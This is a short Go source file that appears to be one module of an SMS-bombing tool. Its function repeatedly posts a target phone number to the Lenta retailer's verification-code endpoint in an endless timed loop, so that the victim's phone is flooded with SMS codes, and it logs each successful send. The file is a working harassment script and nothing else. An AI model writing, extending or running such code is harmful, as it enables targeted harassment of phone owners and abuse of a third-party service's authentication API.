package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func lenta() {
	req := newreq()
	req.SetBodyString(`{"phone":"` + num + `"}`)
	req.Header.SetContentType("application/json")
	req.SetRequestURI("https://lk.lenta.com/api/v1/authentication/requestValidationCode")
	req.Header.SetMethod("POST")

	timeout := time.Minute*2 + time.Second*2
	if logging > 0 {
		var (
			err  error
			body string
		)
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			body = string(res.Body())
			if err == nil && strings.Index(body, `errorCode`) == -1 && strings.Index(body, `"phoneNumber":"`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
